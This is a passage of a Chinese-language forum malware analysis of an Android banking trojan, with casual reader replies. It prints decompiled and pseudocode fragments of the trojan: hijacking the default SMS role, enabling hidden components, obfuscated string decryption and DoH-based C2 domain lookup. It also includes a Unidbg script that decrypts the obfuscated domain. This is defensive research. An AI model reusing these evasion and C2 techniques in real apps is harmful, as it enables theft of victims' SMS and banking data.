          intent.putExtra("package", getPackageName())
          startActivity(intent)

      # 用户授权后 → handleRoleGranted()

  def handleRoleGranted():
      # 获得默认SMS应用权限后
      enable_hidden_components()  # 启用17个隐藏组件
      start_malicious_services()  # 启动恶意服务
      schedule_periodic_worker()  # 每30秒执行任务
      request_battery_whitelist()  # 请求电池优化白名单
      request_notification_access()  # 请求通知访问

      # 最后打开外部URL并退出
      open_url(DECRYPTED_TARGET_URL)
      finish_and_remove_task()

  def enable_hidden_components():
      # 动态启用所有恶意组件（安装时禁用，避免检测）
      for component in MALICIOUS_COMPONENTS:
          packageManager.setComponentEnabledSetting(
              component,
              COMPONENT_ENABLED_STATE_ENABLED,
              DONT_KILL_APP
          )
```

服务启动器代码：

```
    private final void startAllServices() {
        for (Class cls : CollectionsKt__CollectionsKt.listOfNotNull(MuqetobanerijomuService_c054.class)) { // here
            try {
                startForegroundService(new Intent(this, (Class<?>) cls));
            } catch (Exception unused) {
                StringFog.decrypt(new byte[]{-95, -100, 85, 58, -86, 123, 91, -46, -113, -116, 93, 42, -76, 119, 94, -50, -76, -118, 69, 54, -78, 119, 73, -62, -86, -34, 7, 59, -90}, new byte[]{-11, -23, 49, 95, -60, 30, Base64.padSymbol, -69});
                "Ошибка при запуске сервиса ".concat(cls.getSimpleName());
            }
        }
        try {
            Intrinsics.checkNotNullParameter(RegizecumolaWorker_a1bd.class, "workerClass");
            // ...
    }
```

# 0x5 C2 回连地址分析

核心的后台服务是`MuqetobanerijomuService_c054`，负责与 C2 服务器建立连接。我们重点分析服务器域名的获取方式。

```
public final Object fetchDomain(Context context0, Continuation continuation0) {
        // ...
        switch(falorifaxiwotimoConfig_f3a5$fetchDomain$10.label) {
            case 0: {
                ResultKt.throwOnFailure(object0);
                String s = this.decryptString(FalorifaxiwotimoConfig_f3a5.OBFUSCATED_DOMAIN_B64);
                if(s == null) {
                    return Boxing.boxBoolean(false);
                }

                List list0 = CollectionsKt.listOf(new String[]{s, "ru." + s});
                if(this.isRiskyCountry(context0)) {
                    StringFog.decrypt(new byte[]{-83, 24, 51, 120, 70, 4, 12, -24, 42, -12, -6, -12, -101, -85, 69, -56, 42, -20, -25, -2, -104, -30, 73, -56, 0x6F, -29, (byte)0xE0, -73, -74, -62, 107, -28, 0x6F, (byte)0xD0, -38, -60, -75, -91, 12, -7, 60, -21, -3, -16, -34, -35, 0x7C, -1, 0x6F, -14, (byte)0xE1, -2, (byte)0x91, -7, 69, -40, 54, -84}, new byte[]{0x4F, (byte)0x82, -109, -105, -2, (byte)0x8B, 44, -84});
                    list0 = CollectionsKt.listOf(new String[]{"ru." + s, s});
                }

                LinkedHashSet linkedHashSet0 = new LinkedHashSet();
                list1 = list0;
                okHttpClient0 = new Builder().connectTimeout(5L, TimeUnit.SECONDS).build();
                falorifaxiwotimoConfig_f3a5$fetchDomain$11 = falorifaxiwotimoConfig_f3a5$fetchDomain$10;
                set0 = linkedHashSet0;
                context1 = context0;
                break;
            }
            // ...
```

其中`OBFUSCATED_DOMAIN_B64`是通过 StringFog 混淆得到：

```
StringFog.decrypt(new byte[]{(byte)0x8F, 0x60, -15, -46, 0x75, (byte)0xB1, (byte)0xC0, -58, -107, 89, -7, -42, 0x72, (byte)0xA1, -106, -93}, new byte[]{-61, 33, -55, -103, 51, -42, -85, -98});
```

解密得到 Base64 密文`LA8KFgkXVx0OAw==`，需要进行第二层解密。

```
    private final String decryptString(String base64String) {
        try {
            String strMzfnltfs = Yofasikumezekoxano.INSTANCE.mzfnltfs(base64String);
            if (strMzfnltfs.length() == 0) {
                return null;
            }
            return strMzfnltfs;
        } catch (Exception unused) {
            return null;
        }
    }
```

对应的 Native 方法是`public final native String mchrqrho(String data);`，JNI 函数地址为`RX@0x40064fa0[liblibnrvzvh.so]0x64fa0`。

使用 Unidbg 模拟执行：

```
private void callDec() throws IOException {
        long FuncAddr = 0x64FA0;
        Pointer jniEnv = vm.getJNIEnv();
        DvmClass appClass =
                vm.resolveClass("com/yourcompany/core/jni/Yofasikumezekoxano");

        DvmObject<?> app =
                appClass.newObject(null);

        int handle = vm.addLocalObject(app);

// 创建 Java String
        StringObject strObj = new StringObject(vm, "LA8KFgkXVx0OAw==");
        int str = vm.addLocalObject(strObj);

        List<Object> list = new ArrayList<>();
        list.add(jniEnv);   // X0
        list.add(handle);   // X1 (this)
        list.add(str);      // X2 (jstring)

        Number ret = module.callFunction(emulator, FuncAddr, list.toArray());

        DvmObject<?> result = vm.getObject(ret.intValue());
        System.out.println(result.getValue());
    }
```

执行后得到第二层密文`ATlpPTIHHww7EkghOTFWSw==`，该密文被拼接到`DNS_RESOLVERS`进行 DoH（DNS over HTTPS）查询。

```
iterator0 = FalorifaxiwotimoConfig_f3a5.DNS_RESOLVERS.iterator();
s5 = (String)object2;
iterator1 = iterator2;
while(iterator0.hasNext()) {
    Object object3 = iterator0.next();
    s4 = (String)object3;
    long v1 = System.currentTimeMillis();
    try {
        stringBuilder0 = new StringBuilder();
        stringBuilder0.append(s4);
    } catch(Exception unused_ex) {
        goto label_144;
    }
    try {
        stringBuilder0.append("?name=");
        stringBuilder0.append(s5); // 之前得到的ATlpPTIHHww7EkghOTFWSw==
        stringBuilder0.append("&type=TXT&random=");
        stringBuilder0.append(v1); // 时间戳
    }
```

DNS 服务器地址列表如下：

```
private static final List<String> DNS_RESOLVERS =
    listOf(
        "https://dns.google/resolve",
        "https://1.1.1.1/dns-query",
        "https://cloudflare-dns.com/dns-query"
    );
```

DoH 查询会返回包含真实 C2 域名的 TXT 记录，但目前该 DNS 记录未发布或已失效，无法获取目标域名。

# 0x6 写在最后

本次分析从原始APK中总共提取出了三个文件：第一个Dex文件包含VPN、环境检查等反沙箱逻辑；第二个APK文件作为壳层，负责动态加载和包名替换；第三个Dex文件是最终的恶意载荷，实现了短信拦截、默认短信应用劫持以及C2回连等核心功能。

整体而言，这个银行木马的逆向难度并不高，主要的对抗集中在：多层加壳（Assets XOR +  zlib解压）、环境检测（检测Bot包名、安装应用数量、安装时间分布）、组件动态启用（安装时禁用恶意组件避免静态检测），以及简单的字符串混淆。此外，由于DoH查询已失效，或者，攻击者目前还没上传对应的DNS条目，也许在未来将会上传。

---

# 回复

## 回复 by ldz666 (#2)

*2026-7-7 21:13*

woc，格式为什么会这样

## 回复 by Moezero (#3)

*2026-7-7 21:50*

脱壳网站更新了可以重新试试看看

## 回复 by Cure. (#4)

*2026-7-8 15:00*

学习

## 回复 by 巷口的那只猫 (#5)

*2026-7-13 10:12*

推特好多假的福利姬 就引流到tg下载类似apk，主要就是上传图片 联系人 短信等功能，倒没主动发送sms功能。

## 回复 by 葱葱油油 (#6)

*2026-7-13 17:28*

学习了，但没学会

## 回复 by mb_tdrjaabq (#7)

*2026-7-17 10:18*

>
> [巷口的那只猫](https://bbs.kanxue.com/user-990468.htm)
>  推特好多假的福利姬 就引流到tg下载类似apk，主要就是上传图片 联系人 短信等功能，倒没主动发送sms功能。
>

还不能看拉完了真的
